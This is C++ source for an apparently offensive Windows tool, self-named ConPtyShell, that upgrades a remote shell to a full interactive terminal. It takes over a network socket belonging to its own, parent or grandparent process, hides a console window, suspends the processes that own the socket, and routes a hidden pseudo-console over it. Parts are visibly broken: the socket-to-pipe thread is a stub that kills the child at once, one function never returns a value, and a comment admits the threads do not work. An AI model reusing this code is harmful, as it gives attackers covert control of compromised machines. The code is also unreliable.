#include "spawn.h"

DWORD GetParentProcessId(DWORD dwProcessId)
{
    HANDLE hSnapshot;
    PROCESSENTRY32 pe32;
    DWORD ppid = 0;
    DWORD pid = dwProcessId;
    if(pid == 0) 
        pid = GetCurrentProcessId();
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    __try {
        if (hSnapshot == INVALID_HANDLE_VALUE) __leave;

        ZeroMemory(&pe32, sizeof(pe32));
        pe32.dwSize = sizeof(pe32);
        if (!Process32First(hSnapshot, &pe32)) __leave;

        do {
            if (pe32.th32ProcessID == pid) {
                ppid = pe32.th32ParentProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    __finally {
        if (hSnapshot != INVALID_HANDLE_VALUE && hSnapshot != NULL) CloseHandle(hSnapshot);
    }
    return ppid;
}

HANDLE GetProcessHandle(DWORD dwProcessId)
{
    HANDLE hProcess = NULL;
    if (dwProcessId != 0) 
    {
        hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwProcessId);
    }
    return hProcess;
}

bool GetProcessCwd(DWORD dwProcessId, CString& csCurrentWorkingDirectory)
{
    bool bRes = false;

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwProcessId);
    if (hProcess != INVALID_HANDLE_VALUE && hProcess != NULL)
    {
        // Load NTDLL library and get NtQueryInformationProcess function pointer
        HMODULE hNtdll = LoadLibrary(L"ntdll.dll");
        if (hNtdll != NULL)
        {
            NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hNtdll, "NtQueryInformationProcess");
            if (NtQueryInformationProcess != NULL)
            {
                PROCESS_BASIC_INFORMATION basicInfo;
                ULONG ulReturnLength;
                NTSTATUS ntStatus = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &basicInfo, sizeof(basicInfo), &ulReturnLength);
                if (NT_SUCCESS(ntStatus))
                {
                    // Read PEB structure from child process memory
                    PEB peb;
                    SIZE_T bytesRead;
                    if (ReadProcessMemory(hProcess, basicInfo.PebBaseAddress, &peb, sizeof(peb), &bytesRead))
                    {
                        // Read RTL_USER_PROCESS_PARAMETERS structure from child process memory
                        RTL_USER_PROCESS_PARAMETERS processParams;
                        if (ReadProcessMemory(hProcess, peb.ProcessParameters, &processParams, sizeof(processParams), &bytesRead))
                        {
                            // Copy current directory path to output string
                            PVOID pBuf = processParams.CurrentDirectoryPath.Buffer;
                            USHORT uLength = processParams.CurrentDirectoryPath.Length;
                            wchar_t* pPath = new wchar_t[uLength / 2 + 1];
                            ZeroMemory(pPath, sizeof(wchar_t) * (uLength / 2 + 1));
                            SIZE_T nRead = 0;
                            ReadProcessMemory(hProcess, pBuf, pPath, uLength, &nRead);
                            csCurrentWorkingDirectory = CString(pPath, uLength);
                            bRes = true;
                            delete[] pPath;
                        }
                    }
                }
            }
            FreeModule(hNtdll);
        }
        CloseHandle(hProcess);
    }
    return bRes;
}

bool CreatePipes(HANDLE& hInputPipeRead, HANDLE& hInputPipeWrite, HANDLE& hOutputPipeRead, HANDLE& hOutputPipeWrite)
{
    // Create the in/out pipes:
    SECURITY_ATTRIBUTES sec;
    memset(&sec, 0, sizeof(SECURITY_ATTRIBUTES));
    sec.bInheritHandle = 1;
    sec.lpSecurityDescriptor = NULL;
    return (CreatePipe(&hInputPipeRead, &hInputPipeWrite, &sec, BUFFER_SIZE_PIPE) &&
        CreatePipe(&hOutputPipeRead, &hOutputPipeWrite, &sec, BUFFER_SIZE_PIPE) == TRUE);
}

void InitConsole(HANDLE& hOldStdIn, HANDLE& hOldStdOut, HANDLE& hOldStdErr)
{
    hOldStdIn = GetStdHandle(STD_INPUT_HANDLE);
    hOldStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
    hOldStdErr = GetStdHandle(STD_ERROR_HANDLE);
    HANDLE hStdout = CreateFile(_T("CONOUT$"), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    HANDLE hStdin = CreateFile(_T("CONIN$"), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    SetStdHandle(STD_OUTPUT_HANDLE, hStdout);
    SetStdHandle(STD_ERROR_HANDLE, hStdout);
    SetStdHandle(STD_INPUT_HANDLE, hStdin);
}

void RestoreStdHandles(HANDLE hOldStdIn, HANDLE hOldStdOut, HANDLE hOldStdErr)
{
    SetStdHandle(STD_OUTPUT_HANDLE, hOldStdOut);
    SetStdHandle(STD_ERROR_HANDLE, hOldStdErr);
    SetStdHandle(STD_INPUT_HANDLE, hOldStdIn);
}

bool EnableVirtualTerminalSequenceProcessing()
{
    bool bRes = false;
    DWORD dwOutConsoleMode = 0;
    HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
    if (GetConsoleMode(hStdOut, &dwOutConsoleMode))
    {
        dwOutConsoleMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING | DISABLE_NEWLINE_AUTO_RETURN;
        bRes = SetConsoleMode(hStdOut, dwOutConsoleMode);
    }
    return bRes;
}

HRESULT CreatePseudoConsoleWithPipes(HANDLE hConPtyInputPipeRead, HANDLE hConPtyOutputPipeWrite, UINT uiRows, UINT uiCols, OUT HPCON* phPseudoConsole)
{
    HRESULT hRes = E_FAIL;
    if (EnableVirtualTerminalSequenceProcessing())
    {
        COORD consoleCoord = { 0 };
        consoleCoord.X = (short)uiCols;
        consoleCoord.Y = (short)uiRows;
        hRes = CreatePseudoConsole(consoleCoord, hConPtyInputPipeRead, hConPtyOutputPipeWrite, 0, phPseudoConsole);
    }
    return hRes;
}

HRESULT ConfigureProcessThread(HPCON hPseudoConsole, DWORD_PTR pAttributes, OUT STARTUPINFOEX* pStartupInfo)
{
    HRESULT hRes = E_FAIL;
    SIZE_T pSize = NULL;
    BOOL bSuccess = InitializeProcThreadAttributeList(NULL, 1, 0, &pSize);
    if (pSize != NULL)
    {
        pStartupInfo->StartupInfo.cb = sizeof(STARTUPINFOEX);
        pStartupInfo->lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
            GetProcessHeap(),
            0,
            pSize
        );
        if (InitializeProcThreadAttributeList(pStartupInfo->lpAttributeList, 1, 0, &pSize) == TRUE)
        {
            if (UpdateProcThreadAttribute(pStartupInfo->lpAttributeList, 0, pAttributes, hPseudoConsole, sizeof(hPseudoConsole), NULL, NULL) == TRUE)
            {
                hRes = S_OK;
            }
            else
            {
                HeapFree(GetProcessHeap(), 0, pStartupInfo->lpAttributeList);
                cerr << "Could not set pseudoconsole thread attribute." << endl;
            }
        }
        else
        {
            cerr << _T("Could not set up attribute list. ") << GetLastError() << endl;
        }
    }
    
    return hRes;
}

HRESULT RunProcess(STARTUPINFOEX& startupInfo, CString csCommandLine, OUT PROCESS_INFORMATION* pProcessInfo)
{
    HRESULT hRes = E_FAIL;
    SECURITY_ATTRIBUTES processSec = { 0 };
    int iSecurityAttributeSize = sizeof(processSec);
    processSec.nLength = iSecurityAttributeSize;
    SECURITY_ATTRIBUTES secAttributes = { 0 };
    secAttributes.nLength = iSecurityAttributeSize;
    const size_t charsRequired = csCommandLine.GetLength() + 1; // +1 null terminator
    TCHAR* tcsCmdLineMutable = (TCHAR*)HeapAlloc(GetProcessHeap(), 0, sizeof(TCHAR) * charsRequired);

    if (tcsCmdLineMutable)
    {
        _tcsncpy_s(tcsCmdLineMutable, charsRequired, csCommandLine.GetBuffer(), csCommandLine.GetLength());

        if (CreateProcess(NULL, tcsCmdLineMutable, &processSec, &secAttributes, FALSE,
            EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &startupInfo.StartupInfo, pProcessInfo))
            hRes = S_OK;
        else
            cerr << _T("Could not create process. ") << GetLastError() << endl;
        HeapFree(GetProcessHeap(), 0, tcsCmdLineMutable);
    }
    return hRes;
}

HRESULT CreateChildProcessWithPseudoConsole(HPCON hPseudoConsole, CString csCommandLine, OUT PROCESS_INFORMATION* pProcessInfo)
{
    STARTUPINFOEX startupInfo = { 0 };
    HRESULT hRes = ConfigureProcessThread(hPseudoConsole, PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE, &startupInfo);
    if (SUCCEEDED(hRes))
    {
        hRes = RunProcess(startupInfo, csCommandLine, pProcessInfo);
        HeapFree(GetProcessHeap(), 0, startupInfo.lpAttributeList); // free memory allocated by ConfigureProcessThread
    }
    return hRes;
}

DWORD WINAPI ThreadReadPipeWriteSocket(LPVOID lpParams)
{
    CommunicationThreadParams* pThreadParams = (CommunicationThreadParams*)lpParams;
    HANDLE hPipe = pThreadParams->hOutPipe;
    SOCKET hSock = pThreadParams->hSock;
    bool bOverlapped = pThreadParams->bOverlapped;
    bool bReadSuccess = false;
    DWORD dwBytesSent = 0;
    DWORD dwBytesRead = 0;
    char pBytesToWrite[BUFFER_SIZE_SOCKET];
    do
    {        
        ZeroMemory(pBytesToWrite, BUFFER_SIZE_SOCKET);
        bReadSuccess = ReadFile(hPipe, pBytesToWrite, BUFFER_SIZE_SOCKET, &dwBytesRead, NULL);
        if (bReadSuccess)
        {
            if(bOverlapped)
                dwBytesSent = send(hSock, pBytesToWrite, (int)dwBytesRead, 0);
            else 
            {
                do
                {
                    dwBytesSent = send(hSock, pBytesToWrite, (int)dwBytesRead, 0);
                } while (WSAGetLastError() == WSAEWOULDBLOCK);
            }
        }
    } while (dwBytesSent > 0 && bReadSuccess);
    return 0;
}

HANDLE StartThreadReadPipeWriteSocket(CommunicationThreadParams* pParams)
{
    HANDLE hThread = CreateThread(0, 0, ThreadReadPipeWriteSocket, pParams, 0, 0);
    return hThread;
}

int CheckBufferMatch(char* pBuf, int iBufSize, char* pNewData, int iNewDataSize, char* pControlBuf, int iControlBufSize, char* pRemainBuf, int* pRemainSize)
{
    int iRes = 0; 
    // Concatenate the two input buffers
    char* pConcatBuf = new char[iBufSize + iNewDataSize];
    memcpy(pConcatBuf, pBuf, iBufSize);
    memcpy(pConcatBuf + iBufSize, pNewData, iNewDataSize);
    bool bRes = true;
    // Check if the concatenated buffer matches the control buffer
    if (iBufSize + iNewDataSize >= iControlBufSize)
    {
        for (int i = 0; i < iControlBufSize; ++i)
        {
            if (pConcatBuf[i] != pControlBuf[i])
            {
                bRes = false;
                break;
            }
        }
        // Determine the output values
        if (bRes)
        {
            // If the concatenated buffer matches, return 1 and the remaining bytes in the second buffer
            pRemainBuf = pNewData + iControlBufSize - iBufSize;
            *pRemainSize = iNewDataSize + iBufSize - iControlBufSize;
            iRes = 1;
        }
        else
        {
            // If there is no match, return 0
            iRes = 0;
        }
    }
    else
    {
        for (int i = 0; i < iBufSize + iNewDataSize; ++i)
        {
            cout << pConcatBuf[i] << "!=" << pControlBuf[i] << endl;
            if (pConcatBuf[i] != pControlBuf[i])
            {
                cout << pConcatBuf[i] << "!=" << pControlBuf[i] << endl;
                bRes = false;
                break;
            }
        }
        iRes = bRes ? 2 : 0;
    }

    delete[] pConcatBuf;

    return iRes;
}

bool ReadSockWritePipe(SOCKET hSock, HANDLE hPipe, bool bOverlapped, char pRemain, DWORD dwBufferSize, DWORD& dwRemainSize)
{
    /* Read the socket and write the pipe
    * When it receive a buffer that contains "\x01cG9wZW4K\x01\r" which popen in base64 with \x01 at the beginning and at the end
    * It return with true and copy the remaining data in pRemain buffer
    * The function start bufferizing the data received when it receive a \x01 
    * if the bufferized data doesn't match the control string it send the data in the pipe
    */
    bool bWriteSuccess = false;
    DWORD dwBytesReceived = 0;
    DWORD dwBytesWritten = 0;;
    bool bSocketBlockingOperation = false;
    char pBytesReceived[BUFFER_SIZE_SOCKET];

    if (bOverlapped)
    {
        do
        {
            ZeroMemory(pBytesReceived, BUFFER_SIZE_SOCKET);
            dwBytesReceived = recv(hSock, pBytesReceived, BUFFER_SIZE_SOCKET, 0);
            if (dwBytesReceived > 0)
                bWriteSuccess = WriteFile(hPipe, pBytesReceived, dwBytesReceived, &dwBytesWritten, NULL);
        } while (dwBytesReceived > 0 && bWriteSuccess);
    }
    else
    {
        HANDLE hReadEvent = WSACreateEvent();
        if (hReadEvent != NULL && hReadEvent != INVALID_HANDLE_VALUE)
        {
            // we expect the socket to be non-blocking at this point. we create an asynch event to be signaled when the recv operation is ready to get some data
            if (WSAEventSelect(hSock, hReadEvent, FD_READ) == 0)
            {
                do
                {
                    ZeroMemory(pBytesReceived, BUFFER_SIZE_SOCKET);
                    WSAWaitForMultipleEvents(1, &hReadEvent, true, 500, false);
                    dwBytesReceived = recv(hSock, pBytesReceived, BUFFER_SIZE_SOCKET, 0);
                    // we still check WSAEWOULDBLOCK for a more robust implementation
                    if (WSAGetLastError() != WSAEWOULDBLOCK)
                    {
                        WSAResetEvent(hReadEvent);
                        bSocketBlockingOperation = false;
                        bWriteSuccess = WriteFile(hPipe, pBytesReceived, dwBytesReceived, &dwBytesWritten, NULL);
                    }
                    else
                    {
                        bSocketBlockingOperation = true;
                    }
                } while (bSocketBlockingOperation || (dwBytesReceived > 0 && bWriteSuccess));
            }
            WSACloseEvent(hReadEvent);
        }
    }
}


DWORD WINAPI ThreadReadSocketWritePipe(LPVOID lpParams)
{
    CommunicationThreadParams* pThreadParams = (CommunicationThreadParams*)lpParams;
    HANDLE hPipe = pThreadParams->hInPipe;
    SOCKET hSock = pThreadParams->hSock;
    HANDLE hChildProcess = pThreadParams->piInfo.hProcess;
    bool bOverlapped = pThreadParams->bOverlapped;
    bool bPopenMode = false; // by default we're in pty mode
    
    CString csCwd;
    bool bRes = GetProcessCwd(pThreadParams->piInfo.dwProcessId, csCwd);
    
    TerminateProcess(hChildProcess, 0);
    return 0;
}

HANDLE StartThreadReadSocketWritePipe(CommunicationThreadParams* pParams)
{
    HANDLE hThread = CreateThread(0, 0, ThreadReadSocketWritePipe, pParams, 0, 0);
    return hThread;
}

HRESULT SpawnPty(CString csCommandLine, DWORD dwRows, DWORD dwCols, char* pPopenControlString, char* pPtyControlString)
{
    HRESULT hRes = E_FAIL;
    HMODULE hKernel32 = LoadLibrary(_T("kernel32.dll"));
    if (hKernel32 != NULL)
    {
        if (GetProcAddress(hKernel32, "CreatePseudoConsole") != NULL)
        {
            FreeLibrary(hKernel32);
            HANDLE hInputPipeRead = NULL;
            HANDLE hInputPipeWrite = NULL;
            HANDLE hOutputPipeRead = NULL;
            HANDLE hOutputPipeWrite = NULL;
            if (CreatePipes(hInputPipeRead, hInputPipeWrite, hOutputPipeRead, hOutputPipeWrite))
            {
                HANDLE hOldStdIn = NULL;
                HANDLE hOldStdOut = NULL;
                HANDLE hOldStdErr = NULL;
                InitConsole(hOldStdIn, hOldStdOut, hOldStdErr);
                WSADATA wsaData;
                if (WSAStartup(MAKEWORD(2, 0), &wsaData) == 0)
                {
                    DWORD dwProcessId = GetCurrentProcessId();
                    DWORD dwParentProcessId = GetParentProcessId();
                    DWORD dwGrandParentProcessId = 0;
                    if (dwParentProcessId != 0)
                        dwGrandParentProcessId = GetParentProcessId(dwParentProcessId);
                    HANDLE hParentProcess = GetProcessHandle(dwParentProcessId);
                    HANDLE hGrandParentProcess = GetProcessHandle(dwGrandParentProcessId);
                    // try to duplicate the socket for the current process
                    bool bOverlapped = false;
                    bool bParentSocketInherited = false;
                    bool bGrandParentSocketInherited = false;
                    SOCKET hSock = DuplicateTargetProcessSocket(dwProcessId, bOverlapped);
                    if (hSock == INVALID_SOCKET && dwParentProcessId != 0)
                    {
                        // if no sockets are found in the current process we try to hijack our current parent process socket
                        hSock = DuplicateTargetProcessSocket(dwParentProcessId, bOverlapped);
                        if (hSock == INVALID_SOCKET && dwGrandParentProcessId != 0)
                        {
                            // damn, even the parent process has no usable sockets, let's try a last desperate attempt in the grandparent process
                            hSock = DuplicateTargetProcessSocket(dwGrandParentProcessId, bOverlapped);
                            if (hSock == INVALID_SOCKET)
                            {
                                cerr << _T("No \\Device\\Afd objects found. Socket duplication failed.") << endl;
                            }
                            else
                            {
                                bGrandParentSocketInherited = true;
                            }
                        }
                        else
                        {
                            bParentSocketInherited = true;
                            // gotcha a usable socket from the parent process, let's see if the grandParent also use the socket
                            if (dwGrandParentProcessId != 0) bGrandParentSocketInherited = IsSocketInherited(hSock, dwGrandParentProcessId);
                        }
                    }
                    else
                    {
                        // the current process got a usable socket, let's see if the parents use the socket
                        if (dwParentProcessId != 0) bParentSocketInherited = IsSocketInherited(hSock, dwParentProcessId);
                        if (dwGrandParentProcessId != 0) bGrandParentSocketInherited = IsSocketInherited(hSock, dwGrandParentProcessId);
                    }
                    if (hSock != INVALID_SOCKET)
                    {
                        bool bNewConsoleAllocated = false;
                        if (GetConsoleWindow() == NULL)
                        {
                            AllocConsole();
                            ShowWindow(GetConsoleWindow(), SW_HIDE);
                            bNewConsoleAllocated = true;
                        }
                        HPCON hPseudoConsole = NULL;
                        int iPseudoConsoleCreationResult = CreatePseudoConsoleWithPipes(hInputPipeRead, hOutputPipeWrite, dwRows, dwCols, &hPseudoConsole);
                        if (iPseudoConsoleCreationResult != 0)
                        {
                            cerr << _T("ERROR: Could not create pseudo console. Error Code ") << iPseudoConsoleCreationResult << endl;
                        }
                        else
                        {
                            PROCESS_INFORMATION childProcessInfo;
                            memset(&childProcessInfo, 0, sizeof(PROCESS_INFORMATION));
                            if (SUCCEEDED(CreateChildProcessWithPseudoConsole(hPseudoConsole, csCommandLine, &childProcessInfo)))
                            {
                                // Note: We can close the handles to the PTY-end of the pipes here
                                // because the handles are dup'ed into the ConHost and will be released
                                // when the ConPTY is destroyed.
                                if (hInputPipeRead != NULL) CloseHandle(hInputPipeRead);
                                if (hOutputPipeWrite != NULL) CloseHandle(hOutputPipeWrite);

                                // we need to suspend other processes that can interact with the duplicated sockets if any. 
                                // This will ensure stdin, stdout and stderr is read/write only by our conpty process
                                if (bParentSocketInherited || bGrandParentSocketInherited)
                                {
                                    HMODULE hNtDll = LoadLibrary(_T("ntdll.dll"));
                                    if (hNtDll != NULL)
                                    {
                                        NtSuspendProcessPtr NtSuspendProcess = (NtSuspendProcessPtr)GetProcAddress(hNtDll, "NtSuspendProcess");
                                        if (NtSuspendProcess != NULL)
                                        {
                                            if (bParentSocketInherited)
                                            {
                                                ASSERT(hParentProcess != NULL && hParentProcess != INVALID_HANDLE_VALUE);
                                                NTSTATUS ntStatus = NtSuspendProcess(hParentProcess);
                                                if (ntStatus != NTSTATUS_SUCCESS)
                                                {
                                                    cerr << _T("WARNING: Failed to suspend parent process") << endl;
                                                }
                                            }
                                            if (bGrandParentSocketInherited)
                                            {
                                                ASSERT(hGrandParentProcess != NULL && hGrandParentProcess != INVALID_HANDLE_VALUE);
                                                NTSTATUS ntStatus = NtSuspendProcess(hGrandParentProcess);
                                                if (ntStatus != NTSTATUS_SUCCESS)
                                                {
                                                    cerr << _T("WARNING: Failed to suspend grandparent process") << endl;
                                                }
                                            }
                                        }
                                        else
                                        {
                                            cerr << _T("WARNING: Failed to find NtSuspendProcess. Cannot suspend parent or grandparent process") << endl;
                                        }
                                        FreeLibrary(hNtDll);
                                    }
                                    else
                                    {
                                        cerr << _T("WARNING: Failed to load ntdll. Cannot suspend parent or grandparent process") << endl;
                                    }
                                }
                                if (!bOverlapped) SetSocketBlockingMode(hSock, 1);
                                // The threads functions doesn't work: Check if there is any problem with the pipes or the socket
                                CommunicationThreadParams params;
                                ZeroMemory(&params, sizeof(CommunicationThreadParams));
                                HANDLE hBlockWriteSockThread = CreateEvent(NULL, TRUE, TRUE, NULL); // handle for the read sock thread to block the write sock thread in popen mode
                                if (hBlockWriteSockThread != NULL && hBlockWriteSockThread != INVALID_HANDLE_VALUE)
                                {
                                    size_t sizePopenControlString = strlen(pPopenControlString);
                                    char* pPopenControlCode = new char[sizePopenControlString + 3];
                                    ZeroMemory(pPopenControlCode, sizePopenControlString + 3);
                                    pPopenControlCode[0] = '\x01';
                                    memcpy(pPopenControlCode + 1, pPopenControlString, sizePopenControlString - 1); // the -1 is to remove the terminal null byte
                                    pPopenControlCode[sizePopenControlString] = '\r';
                                    pPopenControlCode[sizePopenControlString + 1] = '\x01';
                                    //pPopenControlCode[sizePtyControlString + 2] = '\x00';
                                    size_t sizePtyControlString = strlen(pPtyControlString);
                                    char* pPtyControlCode = new char[sizePtyControlString + 3];
                                    ZeroMemory(pPtyControlCode, sizePtyControlString + 3);
                                    pPtyControlCode[0] = '\x01';
                                    memcpy(pPtyControlCode + 1, pPtyControlString, sizePtyControlString - 1); // the -1 is to remove the terminal null byte
                                    pPtyControlCode[sizePtyControlString] = '\r';
                                    pPtyControlCode[sizePtyControlString + 1] = '\x01';
                                    //pPtyControlCode[sizePtyControlString + 2] = '\x00';
                                    params.pPopenControlCode = pPopenControlCode;
                                    params.pPtyControlCode = pPtyControlCode;
                                    params.hInPipe = hInputPipeWrite;
                                    params.hOutPipe = hOutputPipeRead;
                                    params.hSock = hSock;
                                    params.piInfo = childProcessInfo;
                                    params.bOverlapped = bOverlapped;
                                    HANDLE hThreadReadPipeWriteSocket = StartThreadReadPipeWriteSocket(&params);
                                    HANDLE hThreadReadSocketWritePipe = StartThreadReadSocketWritePipe(&params);
                                    char szSuccessMsg[] = "SUCCESS: pty ready!\n";
                                    send(hSock, szSuccessMsg, (int)strlen(szSuccessMsg), 0);
                                    hRes = S_OK;
                                    // wait for the child process until exit
                                    WaitForSingleObject(childProcessInfo.hProcess, INFINITE);
                                    //cleanup everything
                                    TerminateThread(hThreadReadPipeWriteSocket, 0);
                                    TerminateThread(hThreadReadSocketWritePipe, 0);
                                    delete[] pPopenControlCode;
                                    delete[] pPtyControlCode;
                                    if (!bOverlapped)
                                    {
                                        // cancelling the event selection for the socket
                                        WSAEventSelect(hSock, NULL, 0);
                                    }
                                }
                                if (!bOverlapped)
                                {
                                    SetSocketBlockingMode(hSock, 0);
                                }
                                if (bParentSocketInherited || bGrandParentSocketInherited)
                                {
                                    HMODULE hNtDll = LoadLibrary(_T("ntdll.dll"));
                                    if (hNtDll != NULL)
                                    {
                                        NtResumeProcessPtr NtResumeProcess = (NtResumeProcessPtr)GetProcAddress(hNtDll, "NtResumeProcess");
                                        if (NtResumeProcess != NULL)
                                        {
                                            if (bParentSocketInherited)
                                            {
                                                ASSERT(hParentProcess != NULL && hParentProcess != INVALID_HANDLE_VALUE);
                                                NTSTATUS ntStatus = NtResumeProcess(hParentProcess);
                                                if (ntStatus != NTSTATUS_SUCCESS)
                                                {
                                                    cerr << _T("WARNING: Failed to resume parent process") << endl;
                                                }
                                            }
                                            if (bGrandParentSocketInherited)
                                            {
                                                ASSERT(hGrandParentProcess != NULL && hGrandParentProcess != INVALID_HANDLE_VALUE);
                                                NTSTATUS ntStatus = NtResumeProcess(hGrandParentProcess);
                                                if (ntStatus != NTSTATUS_SUCCESS)
                                                {
                                                    cerr << _T("WARNING: Failed to resume grandparent process") << endl;
                                                }
                                            }
                                        }
                                        else
                                        {
                                            cerr << _T("WARNING: Failed to find NtResumeProcess. Cannot resume parent or grandparent process") << endl;
                                        }
                                        FreeLibrary(hNtDll);
                                    }
                                    else
                                    {
                                        cerr << _T("WARNING: Failed to load ntdll. Cannot resume parent or grandparent process") << endl;
                                    }
                                }
                                CloseHandle(childProcessInfo.hThread);
                                CloseHandle(childProcessInfo.hProcess);
                                cout << _T("ConPtyShell kindly exited.") << endl;
                            }
                            if (hPseudoConsole != NULL) ClosePseudoConsole(hPseudoConsole);
                        }
                        if (bNewConsoleAllocated)
                            FreeConsole();
                        closesocket(hSock);
                    }
                    if (hParentProcess != NULL && hParentProcess != INVALID_HANDLE_VALUE) CloseHandle(hParentProcess);
                    if (hGrandParentProcess != NULL && hGrandParentProcess != INVALID_HANDLE_VALUE) CloseHandle(hGrandParentProcess);
                    WSACleanup();
                }
                else
                {
                    cerr << _T("ERROR: Failed to start WinSock API") << endl;
                }
                RestoreStdHandles(hOldStdIn, hOldStdOut, hOldStdErr);
                if (hInputPipeWrite != NULL) CloseHandle(hInputPipeWrite);
                if (hOutputPipeRead != NULL) CloseHandle(hOutputPipeRead);
            }
            else
            {
                cerr << _T("ERROR: Failed to create pipes") << endl;
            }
        }
        else
        {
            cerr << _T("ERROR: The system doesn't support PseudoConsole API") << endl;
        }
    }
    return hRes;
}